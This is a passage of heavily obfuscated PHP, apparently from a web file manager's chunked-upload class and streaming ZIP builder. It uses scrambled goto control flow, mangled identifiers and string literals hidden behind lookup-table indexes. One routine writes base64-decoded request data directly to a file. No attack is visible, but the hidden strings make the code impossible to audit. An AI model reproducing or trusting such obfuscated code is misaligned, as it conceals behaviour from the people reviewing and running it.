D¯”ºóñÅÛ: $C÷¤—¿ùšÒ =& $_SERVER[¬ˆÚÂ”Éğä]; global $in; $this->in =& $in; goto cß‘‹†‰Èå; A¯íàÄ¬¤: $this->checkSize(); $this->tempPathInit(); goto f Œñ™²½Å; f Œñ™²½Å: } public function upload() { goto d¬Ï¢ºŒ±Ë; BƒåÔøĞ˜Â: $F¤«‘ãë¿… = $CØèÀº°­® * $dãÕËğ¼˜¤; $BÂ«Äáê = @fopen($this->tempFile, $A­ÔøéÆ·¡[1993]); fseek($BÂ«Äáê, $F¤«‘ãë¿…); goto e‚œ÷­œ•·; d¬Ï¢ºŒ±Ë: $A­ÔøéÆ·¡ =& $_SERVER[¬ˆÚÂ”Éğä]; $CØèÀº°­® = isset($this->in[$A­ÔøéÆ·¡[1986]]) ? intval($this->in[$A­ÔøéÆ·¡[1986]]) : 0; $E†»¥éŒØº = isset($this->in[$A­ÔøéÆ·¡[1987]]) ? intval($this->in[$A­ÔøéÆ·¡[1987]]) : 1; goto B­Š–Ó»ÜÏ; E¡®ÎŞ‰™è: CacheLock::unlock($this->tempFile); return $this->tempFile; goto B¤›‚ÃâŸâ; aÆ´Î÷×ÈÕ: $EĞíì†âˆù[$A­ÔøéÆ·¡[1996]][$A­ÔøéÆ·¡[1997] . $CØèÀº°­®] = array($A­ÔøéÆ·¡[1998] => $F¤«‘ãë¿…, $A­ÔøéÆ·¡[1049] => $CØèÀº°­®, $A­ÔøéÆ·¡[77] => $BÖã¿ƒ¢Û , $A­ÔøéÆ·¡[164] => $E‹§²òì…¸); $this->statusSet($EĞíì†âˆù); if (count($EĞíì†âˆù[$A­ÔøéÆ·¡[1996]]) != $EĞíì†âˆù[$A­ÔøéÆ·¡[1995]]) { $this->showJson($A­ÔøéÆ·¡[1999] . $CØèÀº°­®, !0); } goto DÜ—„É¼ç‡; f¯á¼ê¼‰¾: CacheLock::lock($this->tempFile, 20); $EĞíì†âˆù = $this->statusGet(); $this->initFileTemp(); goto b¾“ø¹²‹¬; DÜ—„É¼ç‡: ignore_timeout(); if (!$this->checkChunkHash($EĞíì†âˆù)) { $this->showJson($A­ÔøéÆ·¡[2000], !1); } $this->statusSet(!1); goto E¡®ÎŞ‰™è; e‚œ÷­œ•·: $döÖ²‡”„ = $this->writeTo($f¶Ôíˆë, $BÂ«Äáê, $this->tempFile); $E‹§²òì…¸ = IO::hashSimple($f¶Ôíˆë); $BÖã¿ƒ¢Û  = IO::size($f¶Ôíˆë); goto d”¹£ÅÈ½Ì; d”¹£ÅÈ½Ì: @unlink($f¶Ôíˆë); if (!$döÖ²‡”„) { $this->showJson($A­ÔøéÆ·¡[1994] . $CØèÀº°­®, !1); } $EĞíì†âˆù[$A­ÔøéÆ·¡[1995]] = $E†»¥éŒØº; goto aÆ´Î÷×ÈÕ; D£Ø¯‘Ú˜ò: if ($E†»¥éŒØº > 1 && $dãÕËğ¼˜¤ <= 0) { show_json($A­ÔøéÆ·¡[1990], !1); } if ($dãÕËğ¼˜¤ > $BÖã¿ƒ¢Û ) { $E†»¥éŒØº = 1; } if ($E†»¥éŒØº <= 1) { $this->tempFile = $this->tempFile . rand_string(5); $this->statusSet(!1); return $this->moveUploadedFile($this->tempFile); } goto f¯á¼ê¼‰¾; b¾“ø¹²‹¬: $f¶Ôíˆë = $this->moveUploadedFile($f‘Ğ´Øˆ); if ($BÖã¿ƒ¢Û  > 0 && filesize($f¶Ôíˆë) == 0) { $this->showJson($A­ÔøéÆ·¡[1991], !1); } if (!$f¶Ôíˆë) { $this->showJson(LNG($A­ÔøéÆ·¡[1992]), !1); } goto BƒåÔøĞ˜Â; B­Š–Ó»ÜÏ: $f‘Ğ´Øˆ = $this->tempFile . $A­ÔøéÆ·¡[1988] . $CØèÀº°­®; $BÖã¿ƒ¢Û  = isset($this->in[$A­ÔøéÆ·¡[522]]) ? intval($this->in[$A­ÔøéÆ·¡[522]]) : 0; $dãÕËğ¼˜¤ = isset($this->in[$A­ÔøéÆ·¡[1989]]) ? intval($this->in[$A­ÔøéÆ·¡[1989]]) : 0; goto D£Ø¯‘Ú˜ò; B¤›‚ÃâŸâ: } private function checkSize() { $c”×ÄƒÆÉ„ =& $_SERVER[¬ˆÚÂ”Éğä]; if (phpBuild64() || $this->in[$c”×ÄƒÆÉ„[77]] < PHP_INT_MAX) { return; } show_json(LNG($c”×ÄƒÆÉ„[2001]), !1); } private function showJson($cõ›–ÌµÜİ, $C‡ÊÛ–²¬) { CacheLock::unlock($this->tempFile); if (!$C‡ÊÛ–²¬) { return show_json($cõ›–ÌµÜİ, $C‡ÊÛ–²¬); } show_json($cõ›–ÌµÜİ, $C‡ÊÛ–²¬); } public function clearData() { $this->statusSet(!1); if (file_exists($this->tempFile)) { @unlink($this->tempFile); return; } } private function tempPathInit() { goto cóæ¢æ˜í; BáÖÉİàÌÚ: $this->tempFile = $Fö‚“‰ƒ¤Ü . $bƒ÷÷âÇø[2004] . md5($bíŸŒçàÊ‚ . $this->in[$bƒ÷÷âÇø[1545]]); goto fÅÕµœäÈÉ; cóæ¢æ˜í: $bƒ÷÷âÇø =& $_SERVER[¬ˆÚÂ”Éğä]; $Fö‚“‰ƒ¤Ü = TEMP_FILES; @mk_dir($Fö‚“‰ƒ¤Ü); goto d†¡«–‚; d†¡«–‚: touch($Fö‚“‰ƒ¤Ü . $bƒ÷÷âÇø[2002]); $bíŸŒçàÊ‚ = isset($this->in[$bƒ÷÷âÇø[2003]]) ? $this->in[$bƒ÷÷âÇø[2003]] : !1; if (strlen($bíŸŒçàÊ‚) < 30) { $bíŸŒçàÊ‚ = md5(USER_ID . $this->in[$bƒ÷÷âÇø[75]] . $this->fileName . $this->in[$bƒ÷÷âÇø[77]]); } goto BáÖÉİàÌÚ; fÅÕµœäÈÉ: } private function moveUploadedFile($BåÛâ·²ñŸ) { $eø×ŞèÚÃÚ =& $_SERVER[¬ˆÚÂ”Éğä]; $dš­©Šªğ­ = $this->uploadFile; if ($dš­©Šªğ­ == $eø×ŞèÚÃÚ[2005]) { @file_put_contents($BåÛâ·²ñŸ, base64_decode($_REQUEST[$eø×ŞèÚÃÚ[2006]])); } else { if ($dš­©Šªğ­ == $eø×ŞèÚÃÚ[1828]) { $CÚÆäà·ÊÀ = @fopen($BåÛâ·²ñŸ, $eø×ŞèÚÃÚ[1535]); $this->writeTo($dš­©Šªğ­, $CÚÆäà·ÊÀ, $BåÛâ·²ñŸ); } else { if (!move_uploaded_file($dš­©Šªğ­, $BåÛâ·²ñŸ)) { return !1; } } } return $BåÛâ·²ñŸ; } private function writeTo($bÇê²µâÓ, $Aá¬ˆ…ß×ˆ, $DÄ‰±¥É²°) { goto a¬‹·µøÚ‡; aÀäº¶†×: return !0; goto d³Ü„‰Ú¼; a¬‹·µøÚ‡: $d‹¹â¯Ï¨… =& $_SERVER[¬ˆÚÂ”Éğä]; $Bá§˜‡ñ» = $d‹¹â¯Ï¨…[2007] . $DÄ‰±¥É²°; $A©Ïí–§ = CacheLock::lock($Bá§˜‡ñ», 1); goto dšØª¬‘µ; c‹¨¢´³º: fclose($b’Šçğ¹Õ–); fclose($Aá¬ˆ…ß×ˆ); CacheLock::unlock($Bá§˜‡ñ»); goto aÀäº¶†×; dšØª¬‘µ: $b’Šçğ¹Õ– = @fopen($bÇê²µâÓ, $d‹¹â¯Ï¨…[1534]); if (!$b’Šçğ¹Õ– || !$Aá¬ˆ…ß×ˆ || !$A©Ïí–§) { CacheLock::unlock($Bá§˜‡ñ»); return !1; } while (!feof($b’Šçğ¹Õ–)) { fwrite($Aá¬ˆ…ß×ˆ, fread($b’Šçğ¹Õ–, 1024 * 200)); } goto c‹¨¢´³º; d³Ü„‰Ú¼: } private function statusGet() { goto eÉš†ùŒÒî; C‰•ê‘‡¤: $bÑôÈ™Öëë = !1; if (file_exists($bÔ¬‰ŸšÌŸ)) { $bÑôÈ™Öëë = @file_get_contents($bÔ¬‰ŸšÌŸ); } if ($bÑôÈ™Öëë) { $this->statusData = json_decode($bÑôÈ™Öëë, !0); } goto f•ØÏ™×”; f•ØÏ™×”: if (!$this->statusData) { $fŞ§¸¿¢¦Ç = array($C§ÆæìÂ[28] => $this->fileName, $C§ÆæìÂ[1995] => 0, $C§ÆæìÂ[1996] => array()); $this->statusSet($fŞ§¸¿¢¦Ç); } return $this->statusData; goto b£ÙÅ÷ÈŸó; eÉš†ùŒÒî: $C§ÆæìÂ =& $_SERVER[¬ˆÚÂ”Éğä]; if (is_array($this->statusData)) { return $this->statusData; } $bÔ¬‰ŸšÌŸ = $this->tempFile . $C§ÆæìÂ[2008]; goto C‰•ê‘‡¤; b£ÙÅ÷ÈŸó: } public function statusSet($dÁé¦ô¦ÉÑ) { $dšáÕ´ÂÒ  = $this->tempFile . $_SERVER[¬ˆÚÂ”Éğä][2008]; if (!$dÁé¦ô¦ÉÑ) { if (file_exists($dšáÕ´ÂÒ )) { @unlink($dšáÕ´ÂÒ ); } return !0; } $this->statusData = $dÁé¦ô¦ÉÑ; return file_put_contents($dšáÕ´ÂÒ , json_encode($dÁé¦ô¦ÉÑ)); } private function initFileTemp() { $bÊÂ„‚ˆ¤¡ =& $_SERVER[¬ˆÚÂ”Éğä]; if (file_exists($this->tempFile)) { return; } $A‡ÂëÜôáì = fopen($this->tempFile, $bÊÂ„‚ˆ¤¡[2009]); fseek($A‡ÂëÜôáì, $this->in[$bÊÂ„‚ˆ¤¡[77]] - 1, SEEK_SET); fwrite($A‡ÂëÜôáì, $bÊÂ„‚ˆ¤¡[470]); fclose($A‡ÂëÜôáì); } public function checkChunk() { goto aƒ¼Í¶İäİ; aƒ¼Í¶İäİ: $e—¿­æÒâ¢ =& $_SERVER[¬ˆÚÂ”Éğä]; $a„¯áµµµ­ = array(); CacheLock::lock($this->tempFile); goto bÄô­î…êø; bÄô­î…êø: $CØ¦”¡¼Òí = $this->statusGet(); CacheLock::unlock($this->tempFile); foreach ($CØ¦”¡¼Òí[$e—¿­æÒâ¢[1996]] as $b®¾£¤ÀÏ) { $C«Æ¸©„ ß = $b®¾£¤ÀÏ[$e—¿­æÒâ¢[164]]; if ($C«Æ¸©„ ß) { $a„¯áµµµ­[$e—¿­æÒâ¢[2010] . $b®¾£¤ÀÏ[$e—¿­æÒâ¢[1049]]] = $C«Æ¸©„ ß; } } goto d“·……°á”; d“·……°á”: return $a„¯áµµµ­; goto F¡†ìº¾´; F¡†ìº¾´: } private function checkChunkHash($C¿İŒŒ¨) { goto c”¨„Ñ‚»; cİ¥éÔ‹óó: $E‹„ªëŒ‚ = _get($this->in, $A”–åÇï[2011]); if (strlen($E‹„ªëŒ‚) == 32 && IO::hashSimple($this->tempFile) == $fĞ¸‡ò¢óâ && IO::hashMd5($this->tempFile) == $E‹„ªëŒ‚) { return !0; } $EÃšÄÜ–¬° = fopen($this->tempFile, $A”–åÇï[1183]); goto Fö¿îœøò‡; Fö¿îœøò‡: $EÍ‰¬æ = !0; foreach ($C¿İŒŒ¨[$A”–åÇï[1996]] as $E½†…çõ–) { fseek($EÃšÄÜ–¬°, $E½†…çõ–[$A”–åÇï[1998]]); $aá‡›ÃÒ† = PathDriverStream::hash($EÃšÄÜ–¬°, $E½†…çõ–[$A”–åÇï[77]]); if ($E½†…çõ–[$A”–åÇï[164]] != $aá‡›ÃÒ†) { $EÍ‰¬æ = !1; break; } } fclose($EÃšÄÜ–¬°); goto AÎ÷İ™îƒ¾; AÎ÷İ™îƒ¾: return $EÍ‰¬æ; goto C†ï¡Ğó¿¸; c”¨„Ñ‚»: $A”–åÇï =& $_SERVER[¬ˆÚÂ”Éğä]; if (count($C¿İŒŒ¨[$A”–åÇï[1996]]) != $C¿İŒŒ¨[$A”–åÇï[1995]]) { return !1; } $fĞ¸‡ò¢óâ = _get($this->in, $A”–åÇï[2003]); goto cİ¥éÔ‹óó; C†ï¡Ğó¿¸: } public static function fileName() { goto BÏ©°ù•ÃÀ; BÏ©°ù•ÃÀ: $aéÈìîê² =& $_SERVER[¬ˆÚÂ”Éğä]; global $in; $fõÖåÍáİ = isset($in[$aéÈìîê²[28]]) ? $in[$aéÈìîê²[28]] : $aéÈìîê²[33]; goto FÅ¬·¼†‘; Bäˆª±ÔŸ: $DèĞË»¬ = $DèĞË»¬ ? $DèĞË»¬ : time(); $dÆì…‡¡ = strtolower($fõÖåÍáİ); if ($dÆì…‡¡ == $aéÈìîê²[2013] || $dÆì…‡¡ == $aéÈìîê²[2014]) { $fõÖåÍáİ = date($aéÈìîê²[698], $DèĞË»¬) . $aéÈìîê²[70] . $in[$aéÈìîê²[77]] . $aéÈìîê²[1642]; } else { if ($dÆì…‡¡ == $aéÈìîê²[2015]) { $fõÖåÍáİ = date($aéÈìîê²[698], $DèĞË»¬) . $aéÈìîê²[70] . $in[$aéÈìîê²[77]] . $aéÈìîê²[2016]; } } goto e•ŒóµÒÃ; FÅ¬·¼†‘: if (!empty($_FILES)) { $fõÖåÍáİ = $fõÖåÍáİ ? $fõÖåÍáİ : $_FILES[$aéÈìîê²[167]][$aéÈìîê²[386]]; } if (!is_wap()) { return KodIO::clear($fõÖåÍáİ); } $DèĞË»¬ = strtotime($in[$aéÈìîê²[2012]]); goto Bäˆª±ÔŸ; e•ŒóµÒÃ: return KodIO::clear($fõÖåÍáİ); goto D…İİ´”ó£; D…İİ´”ó£: } private function errorInfo($A™×› ¸Á’) { $béÜàøä =& $_SERVER[¬ˆÚÂ”Éğä]; $eİŠ¦Éœäô = array($béÜàøä[2017], $béÜàøä[2018], $béÜàøä[2019], $béÜàøä[2020], $béÜàøä[2021], $béÜàøä[2022], $béÜàøä[2023], $béÜàøä[2024]); return $A™×› ¸Á’ . $béÜàøä[4] . $eİŠ¦Éœäô[$A™×› ¸Á’]; } } class ZipMake { const VERSION = "\x30\56\62\x2e\60"; const ZIP_VERSION = 10; const ZIP_VERSION_64 = 45; const METHOD_STORE = 0; const FILE_HEADER_SIGNATURE = 67324752; const CDR_FILE_SIGNATURE = 33639248; const CDR_EOF_SIGNATURE = 101010256; const DATA_DESCRIPTOR_SIGNATURE = 134695760; const ZIP64_CDR_EOF_SIGNATURE = 101075792; const ZIP64_CDR_LOCATOR_SIGNATURE = 117853008; public $files = array(); public $cdrOffset = 0; public $ofs = 0; protected $needHeaders; protected $outputName; public function __construct($F¸»È‰Ãè = null) { $cé¶£ô›÷ =& $_SERVER[¬ˆÚÂ”Éğä]; $this->outputStream = fopen($cé¶£ô›÷[2025], $cé¶£ô›÷[1239]); $this->outputName = $F¸»È‰Ãè; $this->needHeaders = !0; } public function addFile($dßËÓù—â§, $FŠÆ‡¸”æ“) { goto f¬…‹‘ùè; d„Ó¼ ‹Ò„: while (!feof($Eçµ¥Ê•á´)) { $a£ŠÀ¦é¯Õ = fread($Eçµ¥Ê•á´, 1048576); $this->send($a£ŠÀ¦é¯Õ); } fclose($Eçµ¥Ê•á´); $C¶¥Šõ¦¿¸ = hexdec(hash_file($a‚¬ŸßÕ¦½[2027], $FŠÆ‡¸”æ“)); goto dîå‹Ï—Ë; dîå‹Ï—Ë: $this->addFileFooter($dßËÓù—â§, $bŠ©ò¿ğ, $C¶¥Šõ¦¿¸, $bÒ‰³‰ê“, $aÇ’™šÑø–, $cÅµ‚ƒïõ); goto C¾¸Íó£—Û; f¬…‹‘ùè: $a‚¬ŸßÕ¦½ =& $_SERVER[¬ˆÚÂ”Éğä]; $dßËÓù—â§ = $this->filterFilename($dßËÓù—â§); $bŠ©ò¿ğ = static::METHOD_STORE; goto B›‡Ù„Ûƒó; B›‡Ù„Ûƒó: $cÅµ‚ƒïõ = $this->addFileHeader($dßËÓù—â§, $bŠ©ò¿ğ); $bÒ‰³‰ê“ = $aÇ’™šÑø– = filesize($FŠÆ‡¸”æ“); $Eçµ¥Ê•á´ = fopen($FŠÆ‡¸”æ“, $a‚¬ŸßÕ¦½[2026]); goto d„Ó¼ ‹Ò„; C¾¸Íó£—Û: } public function addFileFromStream($Aİ±ŸğíèŒ, $eÕÚÀŞÜÈ†) { goto a×‘ñŒŸ; d§çÅóĞ£Ø: $FÑÌ‚·­¯ = hash_init($_SERVER[¬ˆÚÂ”Éğä][2027]); while (!feof($eÕÚÀŞÜÈ†)) { $fÀ±ÉŠİÒ = fread($eÕÚÀŞÜÈ†, 1048576); hash_update($FÑÌ‚·­¯, $fÀ±ÉŠİÒ); $this->send($fÀ±ÉŠİÒ); } $cÌÊ‹ğ¢Š = hexdec(hash_final($FÑÌ‚·­¯)); goto AÎ”¸„Çª; eõÁå‡Ïù®: fseek($eÕÚÀŞÜÈ†, 0, SEEK_END); $FñÄÜÙ„³Ë = $BÊ‘šŒó³Ï = ftell($eÕÚÀŞÜÈ†); rewind($eÕÚÀŞÜÈ†); goto d§çÅóĞ£Ø; a×‘ñŒŸ: $Aİ±ŸğíèŒ = $this->filterFilename($Aİ±ŸğíèŒ); $D‡‹×‚Ü±ë = static::METHOD_STORE; $FÒ¶äÍ¯ãŠ = $this->addFileHeader($Aİ±ŸğíèŒ, $D‡‹×‚Ü±ë); goto eõÁå‡Ïù®; AÎ”¸„Çª: $this->addFileFooter($Aİ±ŸğíèŒ, $D‡‹×‚Ü±ë, $cÌÊ‹ğ¢Š, $FñÄÜÙ„³Ë, $BÊ‘šŒó³Ï, $FÒ¶äÍ¯ãŠ); goto CÓ‘ÙÊ’¦‘; CÓ‘ÙÊ’¦‘: } public function finish() { foreach ($this->files as $bÕØƒøÙ¹®) { $this->addCdrFile($bÕØƒøÙ¹®); } $this->addCdr64Eof(); $this->addCdr64Locator(); $this->addCdrEof(); $this->clear(); } protected function addFileHeader($fÆÔÊñÒÊ, $C¼ŠÇì¥Ø) { goto DÆ¯‚ÀÄŸ¯; d«„¿××ù±: $E‡¿¹’î‡ = $this->dosTime(time()); $fÑ¨Ù‹ëãá = array(array($Aİ§¹Ë’ò[2029], static::FILE_HEADER_SIGNATURE), array($Aİ§¹Ë’ò[2030], static::ZIP_VERSION_64), array($Aİ§¹Ë’ò[2030], 8), array($Aİ§¹Ë’ò[2030], $C¼ŠÇì¥Ø), array($Aİ§¹Ë’ò[2029], $E‡¿¹’î‡), array($Aİ§¹Ë’ò[2029], 0), array($Aİ§¹Ë’ò[2029], 4294967295), array($Aİ§¹Ë’ò[2029], 4294967295), array($Aİ§¹Ë’ò[2030], $Fø¨›ÑŞÔ“), array($Aİ§¹Ë’ò[2030], 32)); $A–®ÎóÉ¬½ = array(array($Aİ§¹Ë’ò[2030], 1), array($Aİ§¹Ë’ò[2030], 28), array($Aİ§¹Ë’ò[2031], 0), array($Aİ§¹Ë’ò[2031], 0), array($Aİ§¹Ë’ò[2031], 0), array($Aİ§¹Ë’ò[2029], 0)); goto B¡’¦Ò¿ÂÊ; DÆ¯‚ÀÄŸ¯: $Aİ§¹Ë’ò =& $_SERVER[¬ˆÚÂ”Éğä]; $fÆÔÊñÒÊ = preg_replace($Aİ§¹Ë’ò[2028], $Aİ§¹Ë’ò[33], $fÆÔÊñÒÊ); $Fø¨›ÑŞÔ“ = strlen($fÆÔÊñÒÊ); goto d«„¿××ù±; a•ĞİÂªÛ: return strlen($cìœ¯÷¯ËÓ) + $Fø¨›ÑŞÔ“ + strlen($fœ¶ò»ºé); goto CÈÈ‚™Ò“Í; B¡’¦Ò¿ÂÊ: $cìœ¯÷¯ËÓ = $this->packFields($fÑ¨Ù‹ëãá); $fœ¶ò»ºé = $this->packFields($A–®ÎóÉ¬½); $this->send($cìœ¯÷¯ËÓ . $fÆÔÊñÒÊ . $fœ¶ò»ºé); goto a•ĞİÂªÛ; CÈÈ‚™Ò“Í: } protected function addFileFooter($Eàè±éäé¿, $cö©’ÒÂÎ, $b›»Æ¯Ã—Ğ, $F†æ¢‹Âµ, $C’Î…¤Éê´, $C©‚İŞË©) { $Dî‹­›‰Ğ =& $_SERVER[¬ˆÚÂ”Éğä]; $Fò³èç  = array(array($Dî‹­›‰Ğ[2029], static::DATA_DESCRIPTOR_SIGNATURE), array($Dî‹­›‰Ğ[2029], $b›»Æ¯Ã—Ğ), array($Dî‹­›‰Ğ[2031], $F†æ¢‹Âµ), array($Dî‹­›‰Ğ[2031], $C’Î…¤Éê´)); $aµ¶ øÁ = $this->packFields($Fò³èç ); $this->send($aµ¶ øÁ); $A‡ÈÅ’Æèç = $C©‚İŞË© + $F†æ¢‹Âµ + $Cª¶¼Ó¢; $this->addToCdr($Eàè±éäé¿, $cö©’ÒÂÎ, $b›»Æ¯Ã—Ğ, $F†æ¢‹Âµ, $C’Î…¤Éê´, $A‡ÈÅ’Æèç); } private function addToCdr($eàÕÜÍŠ¢È, $Dù³†Ôã, $FÅŒ…Ö›¨¯, $aÖŞ°àÎÙ–, $F’‰†¯ˆÌ—, $bÉÔÜ«èºĞ) { $this->files[] = array($eàÕÜÍŠ¢È, $Dù³†Ôã, $FÅŒ…Ö›¨¯, $aÖŞ°àÎÙ–, $F’‰†¯ˆÌ—, $this->ofs); $this->ofs += $bÉÔÜ«èºĞ; } protected function addCdrFile($DÚ¬ß¡…¸) { goto Aõ»É†«‡‡; dÕ÷¸“¾‰Å: $this->send($F‰õ§‘—Ò); $this->cdr_ofs += strlen($F‰õ§‘—Ò); goto Aó¸Ûêà„”; bº”½‰‡âÍ: $b¥ÜÊõå·« = $this->dosTime(time()); $Eï­›¢¢Š‡ = array(array($DÜòÒã‘¦ç[2029], static::CDR_FILE_SIGNATURE), array($DÜòÒã‘¦ç[2030], static::ZIP_VERSION_64), array($DÜòÒã‘¦ç[2030], static::ZIP_VERSION_64), array($DÜòÒã‘¦ç[2030], 8), array($DÜòÒã‘¦ç[2030], $cÖœÑŠ–ˆ), array($DÜòÒã‘¦ç[2029], $b¥ÜÊõå·«), array($DÜòÒã‘¦ç[2029], $A¥¢™ô), array($DÜòÒã‘¦ç[2029], 4294967295), array($DÜòÒã‘¦ç[2029], 4294967295), array($DÜòÒã‘¦ç[2030], strlen($c¢²•¨œ)), array($DÜòÒã‘¦ç[2030], 32), array($DÜòÒã‘¦ç[2030], strlen($BóèˆîÔÃÎ)), array($DÜòÒã‘¦ç[2030], 0), array($DÜòÒã‘¦ç[2030], 0), array($DÜòÒã‘¦ç[2029], 32), array($DÜòÒã‘¦ç[2029], 4294967295)); $CìÛ•âÏ¼ = array(array($DÜòÒã‘¦ç[2030], 1), array($DÜòÒã‘¦ç[2030], 28), array($DÜòÒã‘¦ç[2031], $b”×†óğ¢à), array($DÜòÒã‘¦ç[2031], $BÚ—ŞŒæà¤), array($DÜòÒã‘¦ç[2031], $eœöâïš–é), array($DÜòÒã‘¦ç[2029], 0)); goto D„÷ºïÑª; D„÷ºïÑª: $AÊ“´¸‘ˆ× = $this->packFields($Eï­›¢¢Š‡); $fÊ”°¡¦ˆœ = $this->packFields($CìÛ•âÏ¼); $F‰õ§‘—Ò = $AÊ“´¸‘ˆ× . $c¢²•¨œ . $BóèˆîÔÃÎ . $fÊ”°¡¦ˆœ; goto dÕ÷¸“¾‰Å; Aõ»É†«‡‡: $DÜòÒã‘¦ç =& $_SERVER[¬ˆÚÂ”Éğä]; list($c¢²•¨œ, $cÖœÑŠ–ˆ, $A¥¢™ô, $BÚ—ŞŒæà¤, $b”×†óğ¢à, $eœöâïš–é) = $DÚ¬ß¡…¸; $BóèˆîÔÃÎ = $DÜòÒã‘¦ç[33]; goto bº”½‰‡âÍ; Aó¸Ûêà„”: } protected function addCdr64Eof() { goto Fõ“ÖÁÀÑ»; bœáÑœõÔí: $this->send($CˆÁ¥Ğ ß); goto fÆêÜÕ®î‰; Fõ“ÖÁÀÑ»: $EåˆŒ¹Šˆ® =& $_SERVER[¬ˆÚÂ”Éğä]; $bòÏœÜñÖ = count($this->files); $E©à­Ô©Õ = $this->cdr_ofs; goto Aµ¿Á®„àñ; Aµ¿Á®„àñ: $E“³è ©ã = $this->ofs; $cÀ¦‰Œ¥†é = array(array($EåˆŒ¹Šˆ®[2029], static::ZIP64_CDR_EOF_SIGNATURE), array($EåˆŒ¹Šˆ®[2031], 44), array($EåˆŒ¹Šˆ®[2030], static::ZIP_VERSION_64), array($EåˆŒ¹Šˆ®[2030], static::ZIP_VERSION_64), array($EåˆŒ¹Šˆ®[2029], 0), array($EåˆŒ¹Šˆ®[2029], 0), array($EåˆŒ¹Šˆ®[2031], $bòÏœÜñÖ), array($EåˆŒ¹Šˆ®[2031], $bòÏœÜñÖ), array($EåˆŒ¹Šˆ®[2031], $E©à­Ô©Õ), array($EåˆŒ¹Šˆ®[2031], $E“³è ©ã)); $CˆÁ¥Ğ ß = $this->packFields($cÀ¦‰Œ¥†é); goto bœáÑœõÔí; fÆêÜÕ®î‰: } protected function addCdr64Locator() { goto Cï•‹Ú›¼İ; c»¶â¾˜È¦: $this->send($f’Îî’ò‘Õ); goto E¸¸Ş‚ë·; DËˆ£Åƒ¦¶: $fÃèÅ„Ú£Ï = $this->ofs; $A‹÷£¦Æ›¦ = array(array($dµ½¸Á“¹Ô[2029], static::ZIP64_CDR_LOCATOR_SIGNATURE), array($dµ½¸Á“¹Ô[2029], 0), array($dµ½¸Á“¹Ô[2031], $fÃèÅ„Ú£Ï + $aˆù·…Ä©‡), array($dµ½¸Á“¹Ô[2029], 1)); $f’Îî’ò‘Õ = $this->packFields($A‹÷£¦Æ›¦); goto c»¶â¾˜È¦; Cï•‹Ú›¼İ: $dµ½¸Á“¹Ô =& $_SERVER[¬ˆÚÂ”Éğä]; $AøÖÜË·ğ« = count($this->files); $aˆù·…Ä©‡ = $this->cdr_ofs; goto DËˆ£Åƒ¦¶; E¸¸Ş‚ë·: } protected function addCdrEof() { goto f«îÈšæá¦; f«îÈšæá¦: $BÈä§ÃÒ =& $_SERVER[¬ˆÚÂ”Éğä]; $bĞëƒ¿ÎÎÆ = count($this->files); $AŒòß‰İõé = $this->cdr_ofs; goto bµ‰‹š´‹Ÿ; bµ‰‹š´‹Ÿ: $FøæºÒ„ß = $this->ofs; $dÕÉ‡ò–ÓÅ = $BÈä§ÃÒ[33]; $cö½Ë–²» = array(array($BÈä§ÃÒ[2029], static::CDR_EOF_SIGNATURE), array($BÈä§ÃÒ[2030], 0), array($BÈä§ÃÒ[2030], 0), array($BÈä§ÃÒ[2030], $bĞëƒ¿ÎÎÆ), array($BÈä§ÃÒ[2030], $bĞëƒ¿ÎÎÆ), array($BÈä§ÃÒ[2029], 4294967295), array($BÈä§ÃÒ[2029], 4294967295), array($BÈä§ÃÒ[2030], strlen($dÕÉ‡ò–ÓÅ))); goto fÈ¼àî; fÈ¼àî: $EğŞã”£àš = $this->packFields($cö½Ë–²») . $dÕÉ‡ò–ÓÅ; $this->send($EğŞã”£àš); goto AÛ·œªèÛ; AÛ·œªèÛ: } protected function addCdr() { foreach ($this->files as $A‹ô„í°§Æ) { $this->addCdrFile($A‹ô„í°§Æ); } $this->addCdrEof(); } protected function clear() { $this->files = array(); $this->ofs = 0; $this->cdr_ofs = 0; } protected function sendHttpHeaders() { $BØ“Îğ™† =& $_SERVER[¬ˆÚÂ”Éğä]; $E¸åÓ•ø‡‰ = $BØ“Îğ™†[202]; if ($this->outputName) { $c®²÷ëª« = trim(str_replace(array($BØ“Îğ™†[113], $BØ“Îğ™†[55], $BØ“Îğ™†[93], $BØ“Îğ™†[67], $BØ“Îğ™†[217], $BØ“Îğ™†[1005]), $BØ“Îğ™†[33], $this->outputName)); $D‹Ú”•ØÅ‘ = rawurlencode($c®²÷ëª«); $E¸åÓ•ø‡‰ .= "\73\x20\x66\x69\x6c\145\156\x61\155\x65\x2a\75\x75\x74\146\55\70\47\x27{$D‹Ú”•ØÅ‘}"; } $EÇ›ÇàÎå» = array($BØ“Îğ™†[199] => $BØ“Îğ™†[2032], $BØ“Îğ™†[2033] => $E¸åÓ•ø‡‰, $BØ“Îğ™†[2034] => $BØ“Îğ™†[2035], $BØ“Îğ™†[2036] => $BØ“Îğ™†[2037], $BØ“Îğ™†[2038] => $BØ“Îğ™†[2039]); foreach ($EÇ›ÇàÎå» as $d«÷³Š° => $eè¶Í¬Í”÷) { header($d«÷³Š° . $BØ“Îğ™†[892] . $eè¶Í¬Í”÷); } } protected function send($CÍªáÌÁˆœ) { if ($this->needHeaders) { $this->sendHttpHeaders(); } $this->needHeaders = !1; fwrite($this->outputStream, $CÍªáÌÁˆœ); } protected final function dosTime($a­ÙÙŒ„ğ) { $CÁ·¹õïƒ„ =& $_SERVER[¬ˆÚÂ”Éğä]; $C“ôäÄ¦äÕ = getdate($a­ÙÙŒ„ğ); if ($C“ôäÄ¦äÕ[$CÁ·¹õïƒ„[1739]] < 1980) { $C“ôäÄ¦äÕ = array($CÁ·¹õïƒ„[1739] => 1980, $CÁ·¹õïƒ„[2040] => 1, $CÁ·¹õïƒ„[2041] => 1, $CÁ·¹õïƒ„[2042] => 0, $CÁ·¹õïƒ„[2043] => 0, $CÁ·¹õïƒ„[2044] => 0); } $C“ôäÄ¦äÕ[$CÁ·¹õïƒ„[1739]] -= 1980; return $C“ôäÄ¦äÕ[$CÁ·¹õïƒ„[1739]] << 25 | $C“ôäÄ¦äÕ[$CÁ·¹õïƒ„[2040]] << 21 | $C“ôäÄ¦äÕ[$CÁ·¹õïƒ„[2041]] << 16 | $C“ôäÄ¦äÕ[$CÁ·¹õïƒ„[2042]] << 11 | $C“ôäÄ¦äÕ[$CÁ·¹õïƒ„[2043]] << 5 | $C“ôäÄ¦äÕ[$CÁ·¹õïƒ„[2044]] >> 1; } protected function packFields($dÓ’‹¯±ô¬) { $BºÁÒö”Æå =& $_SERVER[¬ˆÚÂ”Éğä]; $BÑ¤¡ì†‹­ = $BºÁÒö”Æå[33]; $DÌ›Î‘œ¸ = array(); foreach ($dÓ’‹¯±ô¬ as $c…Âšğ‹ĞÅ) { 